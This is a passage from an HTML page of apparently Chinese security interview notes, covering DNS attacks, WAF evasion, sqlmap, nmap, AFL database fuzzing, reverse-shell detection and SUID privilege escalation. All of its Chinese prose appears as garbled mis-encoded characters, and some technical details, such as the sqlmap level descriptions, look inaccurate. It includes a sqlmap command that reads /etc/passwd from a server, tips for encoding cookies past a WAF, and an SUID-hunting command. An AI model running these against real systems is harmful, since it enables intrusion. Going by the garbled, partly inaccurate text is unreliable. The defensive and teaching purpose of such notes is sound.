title="DNSåè®®çš„å®‰å…¨é—®é¢˜"></a>DNSåè®®çš„å®‰å…¨é—®é¢˜</h3><ol><li><strong>ç¼“å­˜ä¸­æ¯’</strong>ï¼šæ”»å‡»è€…å‘DNSæœåŠ¡å™¨æ³¨å…¥è™šå‡çš„DNSè®°å½•ï¼Œå¯¼è‡´ç”¨æˆ·è¢«å¼•å¯¼åˆ°é”™è¯¯çš„ç½‘ç«™ã€‚</li><li><strong>DNSåŠ«æŒ</strong>ï¼šæ”»å‡»è€…ç¯¡æ”¹DNSæŸ¥è¯¢ç»“æœï¼Œå°†ç”¨æˆ·å¼•å¯¼åˆ°æ¶æ„ç½‘ç«™ã€‚</li><li><strong>æ‹’ç»æœåŠ¡æ”»å‡»</strong>ï¼šé€šè¿‡å¤§é‡DNSæŸ¥è¯¢å¯¼è‡´DNSæœåŠ¡å™¨è¿‡è½½ï¼Œæ— æ³•æ­£å¸¸å“åº”åˆæ³•è¯·æ±‚ã€‚</li></ol><h3 id="å¸¦å¤–COKIESé‡åˆ°WAFçš„åº”å¯¹"><a href="#å¸¦å¤–COKIESé‡åˆ°WAFçš„åº”å¯¹" class="headerlink" title="å¸¦å¤–COKIESé‡åˆ°WAFçš„åº”å¯¹"></a>å¸¦å¤–COKIESé‡åˆ°WAFçš„åº”å¯¹</h3><ol><li><strong>ç¼–ç æ··æ·†</strong>ï¼šå¯¹Cookieå€¼è¿›è¡ŒURLç¼–ç æˆ–Base64ç¼–ç ï¼Œç»•è¿‡WAFæ£€æµ‹ã€‚</li><li><strong>æ‹†åˆ†Cookie</strong>ï¼šå°†Cookieæ‹†åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«å‘é€ï¼Œæœ€ååœ¨æœåŠ¡å™¨ç«¯ç»„åˆã€‚</li></ol><h3 id="AWVSç™»å½•æ‰«ææ“ä½œ"><a href="#AWVSç™»å½•æ‰«ææ“ä½œ" class="headerlink" title="AWVSç™»å½•æ‰«ææ“ä½œ"></a>AWVSç™»å½•æ‰«ææ“ä½œ</h3><ol><li><strong>å¯åŠ¨AWVS</strong>ï¼šæ‰“å¼€AWVSæ§åˆ¶å°ï¼Œç™»å½•ç³»ç»Ÿã€‚</li><li><strong>æ·»åŠ ç›®æ ‡</strong>ï¼šè¾“å…¥è¦æ‰«æçš„ç›®æ ‡URLã€‚</li><li><strong>é…ç½®æ‰«æå‚æ•°</strong>ï¼šè®¾ç½®æ‰«æèŒƒå›´ã€æ·±åº¦ã€æ‰«æç±»å‹ç­‰å‚æ•°ã€‚</li><li><strong>å¼€å§‹æ‰«æ</strong>ï¼šå¯åŠ¨æ‰«æä»»åŠ¡ï¼ŒAWVSä¼šè‡ªåŠ¨å¯¹ç›®æ ‡è¿›è¡Œæ¼æ´æ£€æµ‹ã€‚</li></ol><h3 id="SQLMAPä½¿ç”¨"><a href="#SQLMAPä½¿ç”¨" class="headerlink" title="SQLMAPä½¿ç”¨"></a>SQLMAPä½¿ç”¨</h3><ol><li><strong>åŸºæœ¬å‘½ä»¤</strong>ï¼š<code>sqlmap -u &quot;http://example.com/page?id=1&quot;</code>ï¼Œå¯¹æŒ‡å®šURLè¿›è¡ŒSQLæ³¨å…¥æ£€æµ‹ã€‚</li><li><strong>çº§åˆ«ä¸åŒºåˆ«</strong>ï¼š<ul><li><strong>Level 1</strong>ï¼šå¿«é€Ÿæ£€æµ‹ï¼Œé€‚åˆåˆæ­¥æ‰«æã€‚</li><li><strong>Level 2</strong>ï¼šä¸­ç­‰æ·±åº¦ï¼Œé€‚åˆæ›´è¯¦ç»†çš„æ£€æµ‹ã€‚</li><li><strong>Level 3</strong>ï¼šæ·±åº¦æ£€æµ‹ï¼Œé€‚åˆå…¨é¢çš„æ¼æ´æŒ–æ˜ã€‚</li></ul></li><li><strong>æ‰«æ•°æ®åŒ…</strong>ï¼š<code>sqlmap -r request.txt</code>ï¼Œä½¿ç”¨ä¿å­˜çš„HTTPè¯·æ±‚æ–‡ä»¶è¿›è¡Œæ‰«æã€‚</li><li><strong>æœ¬åœ°è¯»æ–‡ä»¶</strong>ï¼š<code>sqlmap -u &quot;http://example.com/page?id=1&quot; --file-read=&quot;/etc/passwd&quot;</code>ï¼Œè¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚</li><li><strong>æŒ‡å®šå‚æ•°</strong>ï¼š<code>sqlmap -u &quot;http://example.com/page?id=1&quot; -p id</code>ï¼ŒæŒ‡å®šè¦æµ‹è¯•çš„å‚æ•°ã€‚</li></ol><h3 id="NMAPæ‰«æå‘½ä»¤"><a href="#NMAPæ‰«æå‘½ä»¤" class="headerlink" title="NMAPæ‰«æå‘½ä»¤"></a>NMAPæ‰«æå‘½ä»¤</h3><ol><li><strong>é™Pingæ‰«æ</strong>ï¼š<code>nmap -sP 192.168.1.0/24</code>ï¼Œæ£€æµ‹ç½‘ç»œä¸­çš„æ´»è·ƒä¸»æœºã€‚</li><li><strong>æŸ¥çœ‹ç«¯å£å¼€æ”¾</strong>ï¼š<code>nmap -p 80,443 192.168.1.1</code>ï¼Œæ£€æµ‹æŒ‡å®šç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</li><li><strong>æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯</strong>ï¼š<code>nmap -sV 192.168.1.1</code>ï¼Œè·å–ç›®æ ‡ç³»ç»Ÿçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</li></ol><h2 id="èš‚èš"><a href="#èš‚èš" class="headerlink" title="èš‚èš"></a>èš‚èš</h2><h3 id="å¦‚ä½•ç»™AFLåšé€‚é…å»fuzzæ•°æ®åº“"><a href="#å¦‚ä½•ç»™AFLåšé€‚é…å»fuzzæ•°æ®åº“" class="headerlink" title="å¦‚ä½•ç»™AFLåšé€‚é…å»fuzzæ•°æ®åº“"></a>å¦‚ä½•ç»™AFLåšé€‚é…å»fuzzæ•°æ®åº“</h3><h4 id="1-AFLé€‚é…æ•°æ®åº“fuzz"><a href="#1-AFLé€‚é…æ•°æ®åº“fuzz" class="headerlink" title="1. AFLé€‚é…æ•°æ®åº“fuzz"></a>1. <strong>AFLé€‚é…æ•°æ®åº“fuzz</strong></h4><p>è¦ä½¿ç”¨AFLå¯¹æ•°æ®åº“è¿›è¡Œfuzzæµ‹è¯•ï¼Œé¦–å…ˆéœ€è¦ç¡®ä¿æ•°æ®åº“çš„è¾“å…¥å¯ä»¥è¢«AFLè¯†åˆ«å’Œå¤„ç†ã€‚ä»¥ä¸‹æ˜¯é€‚é…æ­¥éª¤ï¼š</p><ul><li><strong>ç¡®å®šè¾“å…¥æ ¼å¼</strong>ï¼šæ˜ç¡®æ•°æ®åº“æ¥å—çš„è¾“å…¥æ ¼å¼ï¼Œå¦‚SQLè¯­å¥ã€é…ç½®æ–‡ä»¶ç­‰ã€‚</li><li><strong>ç¼–å†™æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆå™¨</strong>ï¼šç”Ÿæˆç¬¦åˆæ•°æ®åº“è¾“å…¥æ ¼å¼çš„æµ‹è¯•ç”¨ä¾‹ã€‚</li><li><strong>è®¾ç½®AFLç¯å¢ƒ</strong>ï¼šé…ç½®AFLä»¥è¯†åˆ«æ•°æ®åº“çš„è¾“å…¥å’Œè¾“å‡ºã€‚</li><li><strong>è¿è¡ŒAFL</strong>ï¼šä½¿ç”¨AFLå¯¹æ•°æ®åº“è¿›è¡Œfuzzæµ‹è¯•ã€‚</li></ul><h4 id="2-fuzzæµç¨‹"><a href="#2-fuzzæµç¨‹" class="headerlink" title="2. fuzzæµç¨‹"></a>2. <strong>fuzzæµç¨‹</strong></h4><ul><li><strong>é€‰å–ç›®æ ‡</strong>ï¼šç¡®å®šè¦æµ‹è¯•çš„æ•°æ®åº“ç»„ä»¶ï¼Œå¦‚SQLè§£æå™¨ã€å­˜å‚¨å¼•æ“ç­‰ã€‚</li><li><strong>ç”Ÿæˆåˆå§‹æµ‹è¯•ç”¨ä¾‹</strong>ï¼šåˆ›å»ºä¸€ç»„åŸºç¡€çš„æµ‹è¯•ç”¨ä¾‹ï¼Œè¦†ç›–å¸¸è§çš„è¾“å…¥åœºæ™¯ã€‚</li><li><strong>è®¾ç½®AFLç¯å¢ƒ</strong>ï¼šé…ç½®AFLçš„è¾“å…¥ç›®å½•å’Œè¾“å‡ºç›®å½•ã€‚</li><li><strong>è¿è¡ŒAFL</strong>ï¼šå¯åŠ¨AFLï¼Œå¼€å§‹fuzzæµ‹è¯•ã€‚</li><li><strong>ç›‘æ§å’Œåˆ†æç»“æœ</strong>ï¼šç›‘æ§AFLçš„è¿è¡ŒçŠ¶æ€ï¼Œåˆ†æå‘ç°çš„å´©æºƒå’Œå¼‚å¸¸ã€‚</li></ul><h4 id="3-AFLçš„æ’æ¡©åŸç†"><a href="#3-AFLçš„æ’æ¡©åŸç†" class="headerlink" title="3. AFLçš„æ’æ¡©åŸç†"></a>3. <strong>AFLçš„æ’æ¡©åŸç†</strong></h4><p>AFLé€šè¿‡ç¼–è¯‘æ—¶æ’æ¡©æ¥æ”¶é›†ç¨‹åºæ‰§è¡Œçš„è¦†ç›–ç‡ä¿¡æ¯ã€‚æ’æ¡©ä»£ç ä¼šæ’å…¥åˆ°ç¨‹åºçš„æ¯ä¸ªåŸºæœ¬å—ä¸­ï¼Œè®°å½•æ‰§è¡Œè·¯å¾„ã€‚AFLåˆ©ç”¨è¿™äº›ä¿¡æ¯æ¥æŒ‡å¯¼å˜å¼‚è¿‡ç¨‹ï¼Œä¼˜å…ˆé€‰æ‹©èƒ½å¤Ÿå‘ç°æ–°æ‰§è¡Œè·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ã€‚</p><h4 id="4-é€‰æ‹©fuzzæµ‹è¯•ç‚¹"><a href="#4-é€‰æ‹©fuzzæµ‹è¯•ç‚¹" class="headerlink" title="4. é€‰æ‹©fuzzæµ‹è¯•ç‚¹"></a>4. <strong>é€‰æ‹©fuzzæµ‹è¯•ç‚¹</strong></h4><ul><li><strong>è¾“å…¥è§£æ</strong>ï¼šæ•°æ®åº“çš„è¾“å…¥è§£ææ¨¡å—æ˜¯å…³é”®æµ‹è¯•ç‚¹ï¼Œå¦‚SQLè§£æå™¨ã€‚</li><li><strong>æŸ¥è¯¢æ‰§è¡Œ</strong>ï¼šæŸ¥è¯¢æ‰§è¡Œå¼•æ“ä¹Ÿæ˜¯é‡è¦çš„æµ‹è¯•ç‚¹ï¼Œå¯èƒ½åŒ…å«å¤æ‚çš„é€»è¾‘ã€‚</li><li><strong>å­˜å‚¨æ“ä½œ</strong>ï¼šæ¶‰åŠæ•°æ®å­˜å‚¨å’Œæ£€ç´¢çš„æ¨¡å—ï¼Œå¦‚å­˜å‚¨å¼•æ“ã€‚</li></ul><h4 id="5-æ•°æ®åº“fuzzå’Œæ™®é€šç¨‹åºfuzzçš„ä¸åŒ"><a href="#5-æ•°æ®åº“fuzzå’Œæ™®é€šç¨‹åºfuzzçš„ä¸åŒ" class="headerlink" title="5. æ•°æ®åº“fuzzå’Œæ™®é€šç¨‹åºfuzzçš„ä¸åŒ"></a>5. <strong>æ•°æ®åº“fuzzå’Œæ™®é€šç¨‹åºfuzzçš„ä¸åŒ</strong></h4><ul><li><strong>å¤æ‚æ€§</strong>ï¼šæ•°æ®åº“é€šå¸¸å…·æœ‰å¤æ‚çš„è¾“å…¥æ ¼å¼å’ŒçŠ¶æ€ç®¡ç†ï¼Œå¢åŠ äº†fuzzçš„éš¾åº¦ã€‚</li><li><strong>è¾“å…¥å¤šæ ·æ€§</strong>ï¼šæ•°æ®åº“æ¥å—å¤šç§ç±»å‹çš„è¾“å…¥ï¼Œå¦‚SQLè¯­å¥ã€é…ç½®æ–‡ä»¶ç­‰ã€‚</li><li><strong>ç¯å¢ƒä¾èµ–</strong>ï¼šæ•°æ®åº“é€šå¸¸è¿è¡Œåœ¨ç‰¹å®šçš„ç¯å¢ƒä¸­ï¼Œå¯èƒ½ä¾èµ–äºç‰¹å®šçš„é…ç½®å’Œæ•°æ®é›†ã€‚</li></ul><h3 id="ç¤ºä¾‹ä»£ç ï¼šAFLé€‚é…æ•°æ®åº“fuzz"><a href="#ç¤ºä¾‹ä»£ç ï¼šAFLé€‚é…æ•°æ®åº“fuzz" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼šAFLé€‚é…æ•°æ®åº“fuzz"></a>ç¤ºä¾‹ä»£ç ï¼šAFLé€‚é…æ•°æ®åº“fuzz</h3><h4 id="1-ç¼–å†™æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆå™¨"><a href="#1-ç¼–å†™æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆå™¨" class="headerlink" title="1. ç¼–å†™æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆå™¨"></a>1. <strong>ç¼–å†™æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆå™¨</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_test_case</span>():</span><br><span class="line">    <span class="comment"># ç”Ÿæˆéšæœºçš„SQLè¯­å¥</span></span><br><span class="line">    sql_statements = [</span><br><span class="line">        <span class="string">&quot;SELECT * FROM users WHERE id = &#123;&#125;;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;INSERT INTO users (name, age) VALUES (&#x27;&#123;&#125;&#x27;, &#123;&#125;);&quot;</span>,</span><br><span class="line">        <span class="string">&quot;UPDATE users SET name = &#x27;&#123;&#125;&#x27; WHERE id = &#123;&#125;;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;DELETE FROM users WHERE id = &#123;&#125;;&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    test_case = random.choice(sql_statements)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="keyword">in</span> test_case:</span><br><span class="line">        test_case = test_case.<span class="built_in">format</span>(</span><br><span class="line">            <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">10</span>)),</span><br><span class="line">            random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> test_case</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆåˆå§‹æµ‹è¯•ç”¨ä¾‹</span></span><br><span class="line">os.makedirs(<span class="string">&#x27;afl_in&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;afl_in/test_<span class="subst">&#123;i&#125;</span>.sql&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(generate_test_case())</span><br></pre></td></tr></table></figure><h4 id="2-è®¾ç½®AFLç¯å¢ƒ"><a href="#2-è®¾ç½®AFLç¯å¢ƒ" class="headerlink" title="2. è®¾ç½®AFLç¯å¢ƒ"></a>2. <strong>è®¾ç½®AFLç¯å¢ƒ</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…AFL</span></span><br><span class="line">wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br><span class="line">tar -xvf afl-latest.tgz</span><br><span class="line"><span class="built_in">cd</span> afl-2.52b/</span><br><span class="line">make</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–è¯‘æ•°æ®åº“ä»£ç ï¼ˆå‡è®¾ä½¿ç”¨MySQLï¼‰</span></span><br><span class="line"><span class="built_in">cd</span> mysql/</span><br><span class="line">CC=/path/to/afl-gcc CXX=/path/to/afl-g++ cmake .</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡ŒAFL</span></span><br><span class="line"><span class="built_in">mkdir</span> afl_out</span><br><span class="line">afl-fuzz -i afl_in -o afl_out ./path/to/database_executable @@</span><br></pre></td></tr></table></figure><h4 id="3-ç›‘æ§å’Œåˆ†æç»“æœ"><a href="#3-ç›‘æ§å’Œåˆ†æç»“æœ" class="headerlink" title="3. ç›‘æ§å’Œåˆ†æç»“æœ"></a>3. <strong>ç›‘æ§å’Œåˆ†æç»“æœ</strong></h4><p>AFLä¼šåœ¨<code>afl_out</code>ç›®å½•ä¸‹ç”Ÿæˆæµ‹è¯•ç»“æœï¼ŒåŒ…æ‹¬å‘ç°çš„å´©æºƒå’Œå¼‚å¸¸ã€‚å¯ä»¥ä½¿ç”¨AFLæä¾›çš„å·¥å…·å¦‚<code>afl-analyze</code>æ¥è¿›ä¸€æ­¥åˆ†æç»“æœã€‚</p><h2 id="å®‰å…¨å¼€å‘å·¥ç¨‹å¸ˆ"><a href="#å®‰å…¨å¼€å‘å·¥ç¨‹å¸ˆ" class="headerlink" title="å®‰å…¨å¼€å‘å·¥ç¨‹å¸ˆ"></a>å®‰å…¨å¼€å‘å·¥ç¨‹å¸ˆ</h2><h3 id="å¦‚ä½•æŸ¥çœ‹è‡ªå·±æœåŠ¡å™¨æŸä¸ªç«¯å£æƒ…å†µ"><a href="#å¦‚ä½•æŸ¥çœ‹è‡ªå·±æœåŠ¡å™¨æŸä¸ªç«¯å£æƒ…å†µ" class="headerlink" title="å¦‚ä½•æŸ¥çœ‹è‡ªå·±æœåŠ¡å™¨æŸä¸ªç«¯å£æƒ…å†µ"></a>å¦‚ä½•æŸ¥çœ‹è‡ªå·±æœåŠ¡å™¨æŸä¸ªç«¯å£æƒ…å†µ</h3><ol><li><p>**ä½¿ç”¨ <code>netstat</code>**ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netstat -tuln | grep :&lt;port&gt;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼šæŸ¥çœ‹ 8080 ç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netstat -tuln | grep :8080</span><br></pre></td></tr></table></figure></li><li><p>**ä½¿ç”¨ <code>lsof</code>**ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> lsof -i :&lt;port&gt;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼šæŸ¥çœ‹ 8080 ç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> lsof -i :8080</span><br></pre></td></tr></table></figure></li></ol><h3 id="å¦‚ä½•æŸ¥çœ‹è¿œç¨‹æœåŠ¡å™¨æƒ…å†µ"><a href="#å¦‚ä½•æŸ¥çœ‹è¿œç¨‹æœåŠ¡å™¨æƒ…å†µ" class="headerlink" title="å¦‚ä½•æŸ¥çœ‹è¿œç¨‹æœåŠ¡å™¨æƒ…å†µ"></a>å¦‚ä½•æŸ¥çœ‹è¿œç¨‹æœåŠ¡å™¨æƒ…å†µ</h3><ol><li><p>**ä½¿ç”¨ <code>telnet</code>**ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;remote_host&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼šæ£€æŸ¥è¿œç¨‹æœåŠ¡å™¨çš„ 80 ç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.1.1 80</span><br></pre></td></tr></table></figure></li><li><p>**ä½¿ç”¨ <code>nc</code>**ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv &lt;remote_host&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼šæ£€æŸ¥è¿œç¨‹æœåŠ¡å™¨çš„ 443 ç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv 192.168.1.1 443</span><br></pre></td></tr></table></figure></li><li><p><strong>é€šè¿‡ä¸‰æ¬¡æ¡æ‰‹æŸ¥çœ‹</strong>ï¼š<br>ä½¿ç”¨ <code>nmap</code> æ‰«æè¿œç¨‹ä¸»æœºçš„ç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS &lt;remote_host&gt;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼šæ‰«æè¿œç¨‹ä¸»æœºçš„æ‰€æœ‰å¼€æ”¾ç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 192.168.1.1</span><br></pre></td></tr></table></figure></li></ol><h3 id="åå¼¹-shell-å¦‚ä½•æ£€æµ‹"><a href="#åå¼¹-shell-å¦‚ä½•æ£€æµ‹" class="headerlink" title="åå¼¹ shell å¦‚ä½•æ£€æµ‹"></a>åå¼¹ shell å¦‚ä½•æ£€æµ‹</h3><ol><li><p><strong>é€šè¿‡ <code>netstat</code> æŸ¥çœ‹å¯ç–‘è¿æ¥</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netstat -tuln</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸çš„å¤–è¿ã€‚</p></li><li><p><strong>é€šè¿‡ <code>lsof</code> æŸ¥çœ‹å¯ç–‘è¿›ç¨‹</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> lsof -i</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸çš„ç½‘ç»œè¿æ¥ã€‚</p></li><li><p><strong>é€šè¿‡æ—¥å¿—åˆ†æ</strong>ï¼š<br>æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—ï¼ˆå¦‚ <code>/var/log/auth.log</code>ï¼‰ä¸­çš„å¼‚å¸¸ç™»å½•è®°å½•ã€‚</p></li></ol><h3 id="å¦‚æœæ”»å‡»è€…ä½¿ç”¨äº†-AWKï¼Œå¦‚ä½•æ£€æµ‹"><a href="#å¦‚æœæ”»å‡»è€…ä½¿ç”¨äº†-AWKï¼Œå¦‚ä½•æ£€æµ‹" class="headerlink" title="å¦‚æœæ”»å‡»è€…ä½¿ç”¨äº† AWKï¼Œå¦‚ä½•æ£€æµ‹"></a>å¦‚æœæ”»å‡»è€…ä½¿ç”¨äº† AWKï¼Œå¦‚ä½•æ£€æµ‹</h3><ol><li><p><strong>æ£€æŸ¥ AWK è¿›ç¨‹</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep awk</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ˜¯å¦æœ‰å¼‚å¸¸çš„ AWK è¿›ç¨‹ã€‚</p></li><li><p><strong>æ£€æŸ¥ AWK è„šæœ¬</strong>ï¼š<br>æ£€æŸ¥ <code>/tmp</code> æˆ–å…¶ä»–ä¸´æ—¶ç›®å½•ä¸­æ˜¯å¦æœ‰å¯ç–‘çš„ AWK è„šæœ¬ã€‚</p></li></ol><h3 id="é™¤äº†è¿›ç¨‹æ ‘çš„å‘½ä»¤åŒ¹é…ï¼Œè¿˜æœ‰å¯ä»¥æ£€æµ‹åå¼¹-shell-çš„æ–¹æ³•å—ï¼Ÿ"><a href="#é™¤äº†è¿›ç¨‹æ ‘çš„å‘½ä»¤åŒ¹é…ï¼Œè¿˜æœ‰å¯ä»¥æ£€æµ‹åå¼¹-shell-çš„æ–¹æ³•å—ï¼Ÿ" class="headerlink" title="é™¤äº†è¿›ç¨‹æ ‘çš„å‘½ä»¤åŒ¹é…ï¼Œè¿˜æœ‰å¯ä»¥æ£€æµ‹åå¼¹ shell çš„æ–¹æ³•å—ï¼Ÿ"></a>é™¤äº†è¿›ç¨‹æ ‘çš„å‘½ä»¤åŒ¹é…ï¼Œè¿˜æœ‰å¯ä»¥æ£€æµ‹åå¼¹ shell çš„æ–¹æ³•å—ï¼Ÿ</h3><ol><li><p><strong>æ£€æŸ¥ç½‘ç»œè¿æ¥</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netstat -tuln</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ˜¯å¦æœ‰å¼‚å¸¸çš„å¤–è¿ã€‚</p></li><li><p><strong>æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—</strong>ï¼š<br>æ£€æŸ¥ <code>/var/log/auth.log</code> æˆ–å…¶ä»–ç›¸å…³æ—¥å¿—æ–‡ä»¶ä¸­çš„å¼‚å¸¸ç™»å½•è®°å½•ã€‚</p></li><li><p><strong>ä½¿ç”¨ IDS&#x2F;IPS</strong>ï¼š<br>éƒ¨ç½²å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆå¦‚ Snortï¼‰æ¥æ£€æµ‹å¼‚å¸¸çš„ç½‘ç»œæµé‡ã€‚</p></li></ol><h3 id="ä½ äº†è§£å“ªäº›ææƒæ‰‹æ®µï¼Ÿ"><a href="#ä½ äº†è§£å“ªäº›ææƒæ‰‹æ®µï¼Ÿ" class="headerlink" title="ä½ äº†è§£å“ªäº›ææƒæ‰‹æ®µï¼Ÿ"></a>ä½ äº†è§£å“ªäº›ææƒæ‰‹æ®µï¼Ÿ</h3><ol><li><p><strong>SUID ææƒ</strong>ï¼š</p><ul><li><strong>åŸç†</strong>ï¼šSUIDï¼ˆSet User IDï¼‰å…è®¸æ™®é€šç”¨æˆ·ä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™æ‰§è¡Œç¨‹åºã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>å†…æ ¸æ¼æ´ææƒ</strong>ï¼š</p><ul><li>åˆ©ç”¨å†…æ ¸æ¼æ´ï¼ˆå¦‚ Dirty COWï¼‰è·å– root æƒé™ã€‚</li></ul></li><li><p><strong>æœåŠ¡æ¼æ´ææƒ</strong>ï¼š</p><ul><li>åˆ©ç”¨æœåŠ¡æ¼æ´ï¼ˆå¦‚ Sudo ææƒæ¼æ´ï¼‰è·å–æ›´é«˜æƒé™ã€‚</li></ul></li></ol><h3 id="ä»€ä¹ˆæ˜¯-SUID-ææƒ"><a href="#ä»€ä¹ˆæ˜¯-SUID-ææƒ" class="headerlink" title="ä»€ä¹ˆæ˜¯ SUID ææƒ"></a>ä»€ä¹ˆæ˜¯ SUID ææƒ</h3><ul><li><strong>åŸç†</strong>ï¼šSUID ä½è®¾ç½®çš„æ–‡ä»¶å…è®¸ä»»ä½•ç”¨æˆ·ä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s /usr/bin/program</span><br></pre></td></tr></table></figure></li></ul><h3 id="è¿›ç¨‹éšè—æŠ€æœ¯æ˜¯ä»€ä¹ˆï¼Œå¦‚ä½•æ£€æµ‹ï¼Ÿ"><a href="#è¿›ç¨‹éšè—æŠ€æœ¯æ˜¯ä»€ä¹ˆï¼Œå¦‚ä½•æ£€æµ‹ï¼Ÿ" class="headerlink" 